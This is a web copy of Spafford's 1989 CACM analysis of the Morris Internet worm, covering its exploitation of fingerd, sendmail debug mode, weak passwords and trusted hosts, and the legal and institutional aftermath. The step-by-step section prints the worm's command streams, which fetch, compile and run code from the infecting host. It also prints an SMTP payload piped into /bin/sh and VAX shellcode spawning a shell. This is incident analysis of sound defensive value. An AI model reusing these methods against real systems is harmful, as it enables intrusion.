<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>

<body bgcolor="#000000" text="#CCCCCC">
<p><font size="2"> Journal: Communications of 
  the ACM June 1989 v32 n6 p678(10)<br>
  <br>
  Title: Crisis and aftermath. (the Internet worm)<br>
  Author: Spafford, Eugene H.<br>
  <br>
  <br>
  Summary: The Internet computer network was attacked on <font color="#FF0000">Nov 
  2, 1988</font>, by a<br>
  computer worm. Although the program affected only Sun Microsystems Sun-3<br>
  workstations and VAX computers running a variant of version 4 of the Berkeley<br>
  Unix, the program spread over a huge section of the network. Early the<br>
  following day a number of methods for containing and eradicating the virus<br>
  had been discovered and published. It was discovered that the worm exploited<br>
  flaws in the Unix operating system's security routines and used some of<br>
  Unix's own utilities to propagate itself. A complete description of the<br>
  workings of the worm and its methods of entry into Unix systems are<br>
  discussed. The aftermath of the infection and the motives of <font color="#FF0000">Robert 
  T.<br>
  Morris</font>, its author, are also discussed.<br>
  <br>
  <br>
  Full Text:<br>
  <br>
  Crisis and Aftermath On the evening of November 2, 1988 the Internet came<br>
  under attack from within. Sometime after 5 p.m., a program was executed on<br>
  one or more hosts connected to the Internet. That program collected host,<br>
  network, and user information, then used that information to break into other<br>
  machines using flaws present in those systems' software. After breaking in,<br>
  the program would replicate itself and the replica would attempt to infect<br>
  other systems in the same manner.<br>
  <br>
  Although the program would only infect Sun Micro-systems' Sun 3 systems and<br>
  VAX computers running variants of 4 BSD UNIX, the program spread quickly, as<br>
  did the confusion and consternation of system administrators and users as<br>
  they discovered the invasion of their systems. The scope of the break-ins<br>
  came as a great surprise to almost everyone, despite the fact that UNIX has<br>
  long been known to have some security weaknesses (cf. [4, 12, 13]).<br>
  <br>
  The program was mysterious to users at sites where it appeared. Unusual files<br>
  were left in the /usr/tmp directories of some machines, and strange messages<br>
  appeared in the log files of some of the utilities, such as the sendmail mail<br>
  handling agent. The most noticeable effect, however, was that systems became<br>
  more and more loaded with running processes as they became repeatedly<br>
  infected. As time went on, some of these machines bacame so loaded that they<br>
  were unable to continue any processing; some machines failed completely when<br>
  their swap space or process tables were exhausted.<br>
  <br>
  By early Thursday morning, November 3, personnel at the University of<br>
  California at Berkeley and Massachusetts Institute of Technology (MIT) had<br>
  "captured" copies of the program and began to analyze it. People at other<br>
  sites also began to study the program and were developing methods of<br>
  eradicating it. A common fear was that the program was somehow tampering<br>
  with system resources in a way that could not be readily detected--that while<br>
  a cure was being sought, system files were being altered or information<br>
  destroyed. By 5 a.m. Thursday morning, less than 12 hours after the program<br>
  was first discovered on the network, the Computer Systems Research Group at<br>
  Berkeley had developed an interim set of steps to halt its spread. This<br>
  included a preliminary patch to the sendmail mail agent. The suggestions<br>
  were published in mailing lists and on the Usenet, although their spread was<br>
  hampered by systems disconnecting from the Internet to attempt a<br>
  "quarantine."<br>
  <br>
  By about 9 p.m. Thursday, another simple, effective method of stopping the<br>
  invading program, without altering system utilities, was discovered at Purdue<br>
  and also widely published. Software patches were posted by the Berkeley<br>
  group at the same time to mend all the flaws that enabled the program to<br>
  invade systems. All that remained was to analyze the code that caused the<br>
  problems and discover who had unleashed the worm--and why. In the weeks that<br>
  followed, other well-publicized computer break-ins occurred and a number of<br>
  debates began about how to deal with the individuals staging these invasions.<br>
  There was also much discussion on the future roles of networks and security.<br>
  Due to the complexity of the topics, conclusions drawn from these discussions<br>
  may be some time in coming. The on-going debate should be of interest to<br>
  computer professionasl everywhere, however.<br>
  <br>
  <font color="#00CCFF"><b>HOW THE WORM OPERATED</b></font><br>
  <br>
  The worm took advantage of some flaws in standard software installed on many<br>
  UNIX systems. It also took advantage of a mechanism used to simplify the<br>
  sharing of resources in local area networks. Specific patches for these<br>
  flaws have been widely circulated in days since the worm program attached the<br>
  Internet.<br>
  <br>
  <font color="#33CCFF"><b>Fingerd</b></font><br>
  <br>
  The finger program is a utility that allows users to obtain information about<br>
  other users. It is usually used to identify the full name or login name of a<br>
  user, whether or not a user is currently logged in, and possibly other<br>
  information about the person such as telephone numbers where he or she can be<br>
  reached. The fingerd program is intended to run as a daemon, or background<br>
  process, to service remote requests using the finger protocol. This daemon<br>
  program accepts connections from remote programs, reads a single line of<br>
  input, and then sends back output matching the received request.<br>
  <br>
  The bug exploited to break fingerd involved overrunning the buffer the daemon<br>
  used for input. The standard C language I/O library has a few routines that<br>
  read input without checking for bounds on the buffer involved. In<br>
  particular, the gets call takes input to a buffer without doing any bounds<br>
  checking; this was the call exploited by the worm. As will be explained<br>
  later, the input overran the buffer allocated for it and rewrote the stack<br>
  frame thus altering the behavior of the program.<br>
  <br>
  The gets routine is not the only routine with this flaw. There is a whole<br>
  family of routines in the C library that may also overrun buffers when<br>
  decoding input or formatting output unless the user explicitly specifies<br>
  limits on the number of characters to be converted. Although experienced C<br>
  programmers are aware of the problems with these routines, they continue to<br>
  use them. Worse, their format is in some sense codified not only by<br>
  historical inclusion in UNIX and the C language, but more formally in the<br>
  forthcoming ANSI language standard for C. The hazard with these calls is<br>
  that any network server or privileged program using them may possibly be<br>
  compromised by careful precalculation of the (in)appropriate input.<br>
  <br>
  Interestingly, at least two long-standing flaws based on this underlying<br>
  problem have recently been discovered in standard BSD UNIX commands. Program<br>
  audits by various individuals have revealed other potential problems, and<br>
  many patches have been circulated since November to deal with these flaws.<br>
  Unfortunately, the library routines will continue to be used, and as our<br>
  memory of this incident fades, new flaws may be introduced with their use.<br>
  <br>
  <font color="#33CCFF"><b>Sendmail</b></font><br>
  <br>
  The sendmail program is a mailer designed to route mail in a heterogeneous<br>
  internetwork. The program operates in a number of modes, but the one<br>
  exploited by the worm involves the mailer operating as a daemon (background)<br>
  process. In this mode, the program is "listening" on a TCP port (#25) for<br>
  attempts to deliver mail using the standard Internet protocol, SMTP (Simple<br>
  Mail Transfer Protocol). When such an attempt is detected, the daemon enters<br>
  into a dialog with the remote mailer to determine sender, recipient, delivery<br>
  instructions, and message contents.<br>
  <br>
  The bug exploited in sendmail had to do with functionality provided by a<br>
  debugging option in the code. The worm would issue the DEBUG command to<br>
  sendmail and then specify a set of commands instead of a user address. In<br>
  normal operation, this is not allowed, but it is present in the debugging<br>
  code to allow testers to verify that mail is arriving at a particular site<br>
  without the need to invoke the address resolution routines. By using this<br>
  option, testers can run programs to display the state of the mail system<br>
  without sending mail or establishing a separate login connection. The debug<br>
  option is often used because of the complexity of configuring sendmail for<br>
  local conditions, and it is often left turned on by many vendors and site<br>
  administrators.<br>
  <br>
  The sendmail program is of immense importance on most Berkeley-derived (and<br>
  other) UNIX systems because it handles the complex tasks of mail routing and<br>
  delivery. Yet, despite its importance and widespread use, most system<br>
  administrators know little about how it works. Stories are often related<br>
  about how system administrators will attempt to write new device drivers or<br>
  otherwise modify the kernel of the operating system, yet they will not<br>
  willingly attempt to modify sendmail or its configuration files.<br>
  <br>
  It is little wonder, then, that bugs are present in sendmail that allow<br>
  unexpected behavior. Other flaws have been found and reported now that<br>
  attention has been focused on the program, but it is not known for sure if<br>
  all the bugs have been discovered and all the patches circulated.<br>
  <font color="#33CCFF"><b><br>
  Passwords</b></font><br>
  <br>
  A key attack of the worm involved attempts to discover user passwords. It<br>
  was able to determine success because the encrypted password of each user was<br>
  in a publicly readable file. In UNIX systems, the user provides a password<br>
  at sign-on to verify identity. The password is encrypted using a permuted<br>
  version of the Data Encryption Standard (DES) algorithm, and the result is<br>
  compared against a previously encrypted version present in a word-readable<br>
  accounting file. If a match occurs, access is allowed. No plaintext<br>
  passwords are contained in the file, and the algorithm is supposedly<br>
  noninvertible without knowledge of the password.<br>
  <br>
  The organization of the passwords in UNIX allows nonprivileged commands to<br>
  make use of information stored in the accounts file, including<br>
  authentification schemes using user passwords. However, it also allows an<br>
  attacker to encrypt lists of possible passwords and then compare them against<br>
  the actual passwords without calling any system function. In effect, the<br>
  security of the passwords is provided by the prohibitive effort of trying<br>
  this approach with all combinations of letters. Unfortunately, as machines<br>
  get faster, the cost of such attempts decreases. Dividing the task among<br>
  multiple processors further reduces the time needed to decrypt a password.<br>
  Such attacks are also made easier when users choose obvious or common words<br>
  for their passwords. An attacker need only try lists of common words until a<br>
  match is found.<br>
  <br>
  The worm used such an attack to break passwords. It used lists of words,<br>
  including the standard online dictionary, as potential passwords. It<br>
  encrypted them using a fast version of the password algorithm and then<br>
  compared the result against the contents of the system file. The worm<br>
  exploited the accessibility of the file coupled with the tendency of users to<br>
  choose common words as their passwords. Some sites reported that over 50<br>
  percent of their passwords were quickly broken by this simple approach.<br>
  <br>
  One way to reduce the risk of such attacks, and an approach that has already<br>
  been taken in some variants of UNIX, is to have a shadow password file. The<br>
  encrypted passwords are saved in a file (shadow) that is readable only by the<br>
  system administrators, and a privileged call performs password encryptions<br>
  and comparisons with an appropriate timed delay (0.5 to 1 second, for<br>
  instance). This would prevent any attempt to "fish" for passwords.<br>
  Additionally, a threshold could be included to check for repeated password<br>
  attempts from the same process, resulting in some form of alarm being raised.<br>
  Shadow password files should be used in combination with encryption rather<br>
  than in place of such techniques, however, or one problem is simply replaced<br>
  by a different one (securing the shadow file); the combination of the two<br>
  methods is stronger than either one alone.<br>
  <br>
  Another way to strengthen the password mechanism would be to change the<br>
  utility that sets user passwords. The utility currently makes a minimal<br>
  attempt to ensure that new passwords are nontrivial to guess. The program<br>
  could be strengthened in such a way that it would reject any choice of a word<br>
  currently in the online dictionary or based on the account name.<br>
  <br>
  A related flaw exploited by the worm involved the use of trusted logins. One<br>
  of the most useful features of BSD UNIX-based networking code is the ability<br>
  to execute tasks on remote machines. To avoid having to repeatedly type<br>
  passwords to access remote accounts, it is possible for a user to specify a<br>
  list of host/login name pairs that are assumed to be "trusted," in the sense<br>
  that a remote access from that host/login pair is never asked for a password.<br>
  This feature has often been responsible for users gaining unauthorized access<br>
  to machines (cf. [11]), but it continues to be used because of its great<br>
  convenience.<br>
  <br>
  The worm exploited the mechanism by locating machines that might "trust" the<br>
  current machine/login being used by the worm. This was done by examining<br>
  files that listed remote machine/logins used by the host. Often, machines<br>
  and accounts are reconfigured for reciprocal trust. Once the worm found such<br>
  likely candidates, it would attempt to instantiate itself on those machines<br>
  by using the remote execution facility--copying itself to the remote machines<br>
  as if it were an authorized user performing a standard remote operation.<br>
  <br>
  To defeat such future attempts requires that the current remote access<br>
  mechanism be removed and possibly replaced with something else. One<br>
  mechanism that shows promise in this area is the Kerberos authentication<br>
  server. This scheme uses dynamic session keys that need to be updated<br>
  periodically. Thus, an invader could not make use of static authorizations<br>
  present in the file system.<br>
  <br>
  <b><font color="#00CCFF">High Level Description</font></b><br>
  <br>
  The worm consisted of two parts: a main program, and a bootstrap or vector<br>
  program. The main program, once established on a machine, would collect<br>
  information on other machines in the network to which the current machine<br>
  could connect. It would do this by reading public configuration files and by<br>
  running system utility programs that present information about the current<br>
  state of network connections. It would then attempt to use the flaws<br>
  described above to establish its bootstrap on each of those remote machines.<br>
  <br>
  The worm was brought over to each machine it infected via the actions of a<br>
  small program commonly referred to as the vector program or as the grappling<br>
  hook program. Some people have referred to it as the l1.c program, since<br>
  that is the file name suffix used on each copy.<br>
  <br>
  This vector program was 99 lines of C code that would be compiled and run on<br>
  the remote machine. The source for this program would be transferred to the<br>
  victim machine using one of the methods discussed in the next section. It<br>
  would then be compiled and invokedon the victim machine with three command<br>
  line arguments: the network address of the infecting machine, the number of<br>
  the network port to connect to on that machine to get copies of the main worm<br>
  files, and a magic number that effectively acted as a one-time-challenge<br>
  password. If the "server" worm on the remote host and port did not receive<br>
  the same magic number back before starting the transfer, it would immediately<br>
  disconnect from the vector program. This may have been done to prevent<br>
  someone from attempting to "capture" the binary files by spoofing a worm<br>
  "server."<br>
  <br>
  This code also went to some effort to hide itself, both by zeroing out its<br>
  argument vector (command line image), and by immediately forking a copy of<br>
  itself. If a failure occurred in transferring a file, the code deleted all<br>
  files it had already transferred, then it exited.<br>
  <br>
  Once established on the target machine, the bootstrap would connect back to<br>
  the instance of the worm that originated it and transfer a set of binary<br>
  files (precompiled code) to the local machine. Each binary file represented<br>
  a version of the main worm program, compiled for a particular computer<br>
  architecture and operating system version. The bootstrap would also transfer<br>
  a copy of itself for use in infecting other systems. One curious feature of<br>
  the bootstrap has provoked many questions, as yet unanswered: the program had<br>
  data structures allocated to enable transfer of up to 20 files; it was used<br>
  with only three. this has led to speculation whether a more extensive<br>
  version of the worm was planned for a later date, and if that version might<br>
  have carried with it other command files, password data, or possibly local<br>
  virus or trojan horse programs.<br>
  <br>
  Once the binary files were transferred, the bootstrap program would load and<br>
  link these files with the local versions of the standard libraries. One<br>
  after another, these programs were invoked. If one of them ran successfully,<br>
  it read into its memory copies of the bootstrap and binary files and then<br>
  deleted the copies on disk. It would then attempt to break into other<br>
  machines. If none of the linked versions ran, then the mechanism running the<br>
  bootstrap (a command file or the parent worm) would delete all the disk files<br>
  created during the attempted infection.<br>
  <font color="#33CCFF"><b><br>
  Step-by-Step Description</b></font><br>
  <br>
  This section contains a more detailed overview of how the worm program<br>
  functioned. The description in this section assumes that the reader is<br>
  somewhat familiar with standard UNIX commands and with BSD UNIX network<br>
  facilities. A more detailed analysis of operation and components can be<br>
  found in [16], with additional details in [3] and [15].<br>
  <br>
  This description starts from the point at which a host is about to be<br>
  infected. At this point, a worm running on another machine has either<br>
  succeeded in establishing a shell on the new host and has connected back to<br>
  the infecting machine via a TCP connection, or it has connected to the SMTP<br>
  port and is transmitting to the sendmail program. The infection proceeded as<br>
  follows:<br>
  <br>
  1. A socket was established on the infecting machine for the vector program<br>
  to connect to (e.g., socket number 32341). A challenge string was<br>
  constructed from a random number (e.g., 8712440). A file name base was also<br>
  constructed using a random number (e.g., 14481910).<br>
  <br>
  2. The vector program was installed and executed using one of two methods:<br>
  <br>
  a. Across a TCP connection to a shell, the worm would send the following<br>
  commands (the three lines beginning with "cc" and the two lines beginning<br>
  with "echo" were sent as a single line): PATH=/bin:/usr/bin:/usr/ucb cd;<br>
  /usr/tmp echo gorch49; sed '/int zz/q' > x14481910.c; echo gorch50 [text of<br>
  vector program] int zz; cc -o z14481910 x14481910.c;./x14481910 128.32.134.16<br>
  32341 8712440; rm -f x14481910 x14481910.c; echo DONE<br>
  <br>
  Then it would wait for the string "DONE" to signal that the vector program<br>
  was running.<br>
  <br>
  b. Using the SMTP connection, it would transmit (the three lines beginning<br>
  with "cc" and the two lines beginning with "rcpt"/dev/null were sent as a single<br>
  line): debug mail from: rcpt to: <"!sed -e '1,/*$/'d! /bin/sh;<br>
  exit 0"> data cd /usr/tmp cat > x14481901.c << 'EOF' [text of vector program]<br>
  EOF cc -o x14481910 x14481910.c; x14481910 128.32.134.16 32341 8712440; rm -f<br>
  x14481910 x14481910.c quit<br>
  <br>
  The infecting worm would then wait for up to two minutes on the designated<br>
  port for the vector to contact it.<br>
  <br>
  3. The vector program then connected to the "server," sent the challenge<br>
  string, and transferred three files: a Sun 3 binary version of the worm, a<br>
  VAX version, and the source code for the vector program. After the files<br>
  were copied, the running vector program became (via the execl call) a shell<br>
  with its input and output still connected to the server worm.<br>
  <br>
  4. The server worm sent the following command stream to the connected shell:<br>
  PATH=/bin:/usr/bin:/usr/ucb rm -f sh if [ -f sh ] then P=x14481910 else P=sh<br>
  fi<br>
  <br>
  Then, for each binary file it had transferred (just two in this case,<br>
  although the code is written to allow more), it would send the following form<br>
  of command sequence: cc -o $P x14481910, sun3.o ./$P -p $$ x14481910,sun3.o<br>
  x14481910,vax.o x14481910,11.c rm -f $P<br>
  <br>
  The rm would succeed only if the linked version of the worm failed to start<br>
  execution. If the server determined that the host was now infected, it<br>
  closed the connection. Otherwise, it would try the other binary file. After<br>
  both binary files had been tried, it would send over rm commands for the<br>
  object files to clear away all evidence of the attempt at infection.<br>
  <br>
  5. The new worm on the infected host proceeded to "hide" itself by obscuring<br>
  its argument vector, unlinking the binary version of itself, and killing its<br>
  parent (the $$ argument in the invocation). It then read into memory each of<br>
  the worm binary files, encrypted each file after reading it, and deleted the<br>
  files from disk.<br>
  <br>
  6. Next, the worm gathered information about network interfaces and hosts to<br>
  which the local machine was connected. It built lists of these in memory,<br>
  including information about canonical and alternate names and addresses. It<br>
  gathered some of this information by making direct ioctl calls, and by<br>
  running the netstat program with various arguments. It also read through<br>
  various system files looking for host names to add to its database.<br>
  <br>
  7. It randomized the lists it constructed, then attempted to infect some of<br>
  those hosts. For directly connected networks, it created a list of possible<br>
  host numbers and attempted to infect those hosts if they existed. Depending<br>
  on the type of host (gateway or local network), the worm first tried to<br>
  establish a connection on the telnet or rexec ports to determine reachability<br>
  before it attempted one of the infection methods.<br>
  <br>
  8. The infection attempts proceeded by one of three routes: rsh, fingerd, or<br>
  sendmail.<br>
  <br>
  a. The attack via rsh was done by attempting to spawn a remote shell by<br>
  invocation of (in order of trial) /usr/ucb/rsh, /usr/bin/rsh, and /bin/rsh.<br>
  If successful, the host was infected as in steps 1 and 2(a).<br>
  <br>
  b. The attack via the finger daemon was somewhat more subtle. A connection<br>
  was established to the remote finger server daemon and then a specially<br>
  constructed string of 536 bytes was passed to the daemon, overflowing its<br>
  input buffer and overwriting parts of the stack. For standard 4BSD versions<br>
  running on VAX computers, the overflow resulted in the return stack frame for<br>
  the main routine being changed so that the return address pointed into the<br>
  buffer on the stack. The instructions that were written into the stack at<br>
  that location were: pushl $68732f '/sh\0' pushl $6e69622f '/bin' movl sp, r10<br>
  pushl $0 pushl $0 pushl r10 pushl $3 movl sp,ap chmk $3b<br>
  <br>
  That is, the code executed when the main routine attempted to return was:<br>
  execve("/bin/sh", 0, 0)<br>
  <br>
  On VAXs, this resulted in the worm connected to a remote shell via the TCP<br>
  connection. The worm then proceeded to infect the host as in steps 1 and<br>
  2(a). On Suns, this simply resulted in a core dump since the code was not in<br>
  place to corrupt a Sun version of fingerd in a similar fashion. Curiously,<br>
  correct machine-specific code to corrupt Suns could have been written in a<br>
  matter of hours and included, but was not [16].<br>
  <br>
  c. The worm then tried to infect the remote host by establishing a connection<br>
  to the SMTP port and mailing an infection, as in step 2(b).<br>
  <br>
  Not all the steps were attempted. As soon as one method succeeded, the host<br>
  entry in the internal list was marked as infected and the other methods were<br>
  not attempted.<br>
  <br>
  9. Next, it entered a state machine consisting of five states. Each state but<br>
  the last was run for a short while, then the program looped back to step 7<br>
  (attempting to break into other hosts via sendmail, finger, or rsh). The<br>
  first four of the five states were attempts to break into user accounts on<br>
  the local machine. The fifth state was the final state, and occurred after<br>
  all attempts had been made to break all passwords. In the fifth state, the<br>
  worm looped forever trying to infect hosts in its internal tables and marked<br>
  as not yet infected. The first four states were:<br>
  <br>
  a. The worm read through the /etc/hosts.equiv files and /.rhosts files to<br>
  find the names of equivalent hosts. These were marked in the internal table<br>
  of hosts. Next, the worm read the /etc/passwd (the account and password<br>
  file) file into an internal data structure. As it was doing this, it also<br>
  examined the .forward file (used to forward mail to a different host<br>
  automatically) in each user home directory and included those host names in<br>
  its internal table of hosts to try. Oddly, it did not similarly check user<br>
  .rhosts files.<br>
  <br>
  b. The worm attempted to break each user password using simple choices. The<br>
  worm first checked the obvious case of no password. Then, it used the account<br>
  name and user information field to try simple passwords. Assume that the<br>
  user had an entry in the password file like:<br>
  account:abcdefghijklm:100:5:User, Name:/usr/account:/bin/sh<br>
  <br>
  (These represent, respectively, the account name, the encrypted password, the<br>
  user ID number, the user's default group ID number, per-user information<br>
  field, the pathname of the user's home account, and the pathname of the<br>
  user's default command interpreter or shell.) The words tried as potential<br>
  passwords would be account, accountaccount, User, Name, user, name, and<br>
  tnuocca. These are, respectively, the account name, the account name<br>
  concatenated with itself, the first and last names of the user, the user<br>
  names with leading capital letters turned to lowercase, and the account name<br>
  reversed. Experience described in [4] indicates that on systems where users<br>
  are naive about password security, these choices may work for a significant<br>
  percentage of user accounts.<br>
  <br>
  <font color="#33CCFF"><b>Step 10 describes what was done if a password "hit" 
  was achieved.</b></font><br>
  <br>
  c. The third stage in the process involved trying to break the password of<br>
  each user by trying each word present in an internal dictionary of words.<br>
  This dictionary of 432 words was tried against each account in a random<br>
  order, with password "hits" being handled as described in step 10. (The<br>
  complete dictionary is given in [16].)<br>
  <br>
  d. The fourth stage was entered if all other attempts failed. For each word<br>
  in the UNIX online dictionary, the worm would see if it was the password to<br>
  any account. In addition, if the word in the dictionary began with an<br>
  uppercase letter, the letter was converted to lowercase and that word was<br>
  also tried against all the passwords.<br>
  <br>
  10. Once a password was broken for any account, the worm would attempt to<br>
  break into remote machines where that user had accounts. The worm would scan<br>
  the .forward and .rhosts files of the user at this point, and identify the<br>
  names of remote hosts that had accounts used by the target user. It then<br>
  attempted two attacks:<br>
  <br>
  a. The worm would first attempt to create a remote shell using the rexec<br>
  service. The attempt would be made using the account name given in the<br>
  .forward or .rhosts file and the user's local password. This took advantage<br>
  of the fact that users often have the same password on their accounts on<br>
  multiple machines.<br>
  <br>
  b. The worm would do a rexec to the current host (using the local user name<br>
  and password) and would try a rsh command to the remote host using the<br>
  username taken from the file. This attack would succeed in those cases where<br>
  the remote machine had a hosts.equiv file or the user had a .rhosts file that<br>
  allowed remote execution without a password.<br>
  <br>
  If the remote shell was created either way, the attack would continue as in<br>
  steps 1 and 2(a). No other use was made of the user password.<br>
  <br>
  Throughout the execution of the main loop, the worm would check for other<br>
  worms running on the same machine. To do this, the worm would attempt to<br>
  connect to another worm on a local, predetermined TCP socket. If such a<br>
  connection succeeded, one worm would (randomly) set its pleasequit variable<br>
  to 1, causing that worm to exit after it had reached part way into the third<br>
  stage (9c) of password cracking. This delay is part of the reason many<br>
  systems had multiple worms running: even though a worm would check for other<br>
  local worms, it would defer its self-destruction until significant effort had<br>
  been made to break local passwords. Furthermore, race conditions in the code<br>
  made it possible for worms on heavily loaded machines to fail to connect,<br>
  thus causing some of them to continue indefinitely despite the presence of<br>
  other worms.<br>
  <br>
  One out of every seven worms would become immortal rather than check for<br>
  other local worms. Based on a generated random number they would set an<br>
  internal flag that would prevent them from ever looking for another worm on<br>
  their host. This may have been done to defeat any attempt to put a fake worm<br>
  process on the TCP port to kill existing worms. Whatever the reason, this<br>
  was likely the primary cause of machines being overloaded with multiple<br>
  copies of the worm.<br>
  <br>
  The worm attempted to send an UDP packet to the host ernie.berkeley.edu<br>
  approximately once every 15 infections, based on a random number comparison.<br>
  The code to do this was incorrect, however, and no information was ever sent.<br>
  Whether this was an intended ruse or whether there was actually some reason<br>
  for the byte to be sent is not currently known. However, the code is such<br>
  that an uninitialized byte is the intended message. It is possible that the<br>
  author eventually intended to run some monitoring program on ernie (after<br>
  breaking into an account, perhaps). Such a program could obtain the sending<br>
  host number from the single-byte message, whether it was sent as a TCP or UDP<br>
  packet. However, no evidence for such a program has been found and it is<br>
  possible that the connection was simply a feint to cast suspicion on<br>
  personnel at Berkeley.<br>
  <br>
  The worm would also fork itself on a regular basis and kill its parent. This<br>
  served two purposes. First, the worm appeared to keep changing its process<br>
  identifier and no single process accumulated excessive amounts of CPU time.<br>
  Secondly, processes that have been running for a long time have their<br>
  priority downgraded by the scheduler. By forking, the new process would<br>
  regain normal scheduling priority. This mechanism did not always work<br>
  correctly, either, as we locally observed some instances of the worm with<br>
  over 600 seconds of accumulated CPU time.<br>
  <br>
  If the worm ran for more than 12 hours, it would flush its host list of all<br>
  entries flagged as being immune or already infected. The way hosts were added<br>
  to this list implies that a single worm might reinfect the same machines<br>
  every 12 hours.<br>
  <br>
  <font color="#33CCFF"><b>AFTERMATH<br>
  </b></font><br>
  In the weeks and months following the release of the Internet worm, there<br>
  have been a number of topics hotly debated in mailing lists, media coverage,<br>
  and personal conversations. I view a few of these as particularly<br>
  significant, and will present them here.<br>
  <font color="#33CCFF"><b><br>
  Author, Intent, and Punishment</b></font><br>
  <br>
  Two of the first questions to be asked--even before the worm was<br>
  stopped--were simply the questions who and why. Who had written the worm,<br>
  and why had he/she/they loosed it upon the Internet? The question of who was<br>
  answered quite shortly thereafter when the New York Times identified Robert<br>
  T. Morris. Although he has not publicly admitted authorship, and no court of<br>
  law has yet pronounced guilt, there seems to be a large body of evidence to<br>
  support such an identification.<br>
  <br>
  Various officials have told me that they have obtained statements from<br>
  multiple individuals to whom Morris spoke about the worm and its development.<br>
  They also have records from Cornell University computers showing early<br>
  versions of the worm code being tested on campus machines. They also have<br>
  copies of the worm code, found in Morris' account.<br>
  <br>
  Thus, the identity of the author seems fairly well-established. But his<br>
  motive remains a mystery. Speculation has ranged from an experiment gone<br>
  awry to an unconscious act of revenge against his father, who is the National<br>
  Computer Security Center's chief scientist. All of this is sheer<br>
  speculation, however, since no statement has been forthcoming from Morris.<br>
  All we have to work with is the decompiled code for the program and our<br>
  understanding of its effects. It is impossible to intuit the real motive<br>
  from those or from various individuals' experiences with the author. We must<br>
  await a definitive statement by the author to answer the question why?<br>
  Considering the potential legal consequences, both criminal and civil, a<br>
  definitive statement from Morris may be some time in coming, if it ever does.<br>
  <br>
  Two things have impressed many people (this author included) who have read<br>
  the decompiled code. First, the worm program contained no code to explicitly<br>
  damage any system on which it ran. Considering the ability and knowledge<br>
  evidenced by the code, it would have been a simple matter for the author to<br>
  have included such commands if that was his intent. Unless the worm was<br>
  released prematurely, it appears that the author's intent did not involve<br>
  destruction or damage of any data or system.<br>
  <br>
  The second feature of note was that the code had no mechanism to halt the<br>
  spread of the worm. Once started, the worm would propagate while also taking<br>
  steps to avoid identification and capture. Due to this and the complex<br>
  argument string necessary to start it, individuals who have examined the worm<br>
  (this author included) believe it unlikely that the worm was started by<br>
  accident or was not intended to propagate widely.<br>
  <br>
  In light of our lack of definitive information, it is puzzling to note<br>
  attempts to defend Morris by claiming that his intent was to demonstrate<br>
  something about Internet security, or that he was trying a harmless<br>
  experiment. Even the president of the ACM, Bryan Kocher, stated that it was<br>
  a prank in [7]. It is curious that this many people, both journalists and<br>
  computer professionals alike, would assume to know the intent of the author<br>
  based on the observed behavior of the program. As Rick Adams of the Center<br>
  for Seismic Studies observed in a posting to the Usenet, we may someday hear<br>
  that the worm was actually written to impress Jodie Foster--we simply do not<br>
  know the real reason.<br>
  <br>
  Coupled with this tendency to assume motive, we have observed very different<br>
  opinions on the punishment, if any, to mete out to the author. One<br>
  oft-expressed opinion, especially by those individuals who believe the worm<br>
  release was an accident or an unfortunate experiment, is that the author<br>
  should not be punished. Some have gone so far as to say that the author<br>
  should be rewarded and the vendors and operators of the affected machines<br>
  should be the ones punished, this on the theory that they were sloppy about<br>
  their security and somehow invited the abuse!<br>
  <br>
  The other extreme school of thought holds that the author should be severely<br>
  punished, including a term in a federal penitentiary. (One somewhat humorous<br>
  example of this point of view was espoused by syndicated columnist Mike<br>
  Royko.)<br>
  <br>
  As has been observed in both [2] and [6], it would not serve us well to<br>
  overreact to this particular incident. However, neither should we dismiss<br>
  it as something of no consequence. The fact that there was no damage done<br>
  may have been an accident, and it is possible that the author intended for<br>
  the program to clog the Internet as it did. Furthermore, we should be wary<br>
  of setting dangerous precedent for this kind of behavior. Excusing acts of<br>
  computer vandalism simply because the authors claim there was no intent to<br>
  cause damage will do little to discourage repeat offenses, and may, in fact,<br>
  encourage new incidents.<br>
  <br>
  The claim that the victims of the worm were somehow responsible for the<br>
  invasion of their machines is also curious. The individuals making this<br>
  claim seem to be stating that there is some moral or legal obligation for<br>
  computer users to track and install every conceivable security fix and<br>
  mechanism available. This completely ignores the fact that many sites run<br>
  turnkey systems without source code or knowledge of how to modify their<br>
  systems. Those sites may also be running specialized software or have<br>
  restricted budgets that prevent them from installing new software versions.<br>
  Many commercial and government sites operate their systems in this way. To<br>
  attempt to blame these individuals for the success of the worm is equivalent<br>
  to blaming an arson victim for the fire because she didn't build her house of<br>
  fireproof metal. (More on this theme can be found in [17].)<br>
  <br>
  The matter of appropriate punishment will likely be decided by a federal<br>
  judge. A grand jury in Syracuse, N.Y., has been hearing testimony on the<br>
  matter. A federal indictment under the United States Code, Title 18, Section<br>
  1030 (the Computer Crime statute), parts (a)(3) or (a)(5) might be returned.<br>
  Section (a)(5), in particular, is of interest. That part of the statute<br>
  makes it a felony if an individual "intentionally accesses a federal interest<br>
  computer without authorization, and by means of one or more instances of such<br>
  conduct alters, damages, or destroys information . . . , or prevents<br>
  authorized use of any such computer or information and thereby causes loss to<br>
  one or more others of a value aggregating $1,000 or more during any one year<br>
  period" (emphasis added). State and civil suits might also be brought in<br>
  this case.<br>
  <br>
  <b><font color="#33CCFF">Worm Hunters</font></b><br>
  <br>
  A significant conclusion reached at the NCSC post-mortem workshop was that<br>
  the reason the worm was stopped so quickly was due almost solely to the UNIX<br>
  "old-boy" network, and not due to any formal mechanism in place at the time.<br>
  A recommendation from that workshop was that a formal crisis center be<br>
  established to deal with future incidents and to provide a formal point of<br>
  contact for individuals wishing to report problems. No such center was<br>
  established at that time.<br>
  <br>
  On November 29, 1988, someone exploiting a security flaw present in older<br>
  versions of the FTP file transfer program broke into a machine on the MILNET.<br>
  The intruder was traced to a machine on the Arpanet, and to immediately<br>
  prevent further access, the MILNET/Arpanet links were severed. During the<br>
  next 48 hours there was considerable confusion and rumor about the<br>
  disconnection, fueled in part by the Defense Communication Agency's attempt<br>
  to explain the disconnection as a "test" rather than as a security problem.<br>
  <br>
  This event, coming as close as it did to the worm incident, prompted DARPA to<br>
  establish the CERT--the Computer Emergency Response Team--at the Software<br>
  Engineering Institute at Carnegie Mellon University. The purpose of CERT is<br>
  to act as a central switchboard and coordinator for computer security<br>
  emergencies on Arpanet and MILnet computers. The Center has asked for<br>
  volunteers from federal agencies and funded laboratories to serve as<br>
  technical advisors when needed.<br>
  <br>
  Of interest here is that CERT is not chartered to deal with any Internet<br>
  emergency. Thus, problems detected in the CSnet, Bitnet, NSFnet, and other<br>
  Internet communities may not be referable to the CERT. I was told that it is<br>
  the hope of CERT personnel that these other networks will develop their own<br>
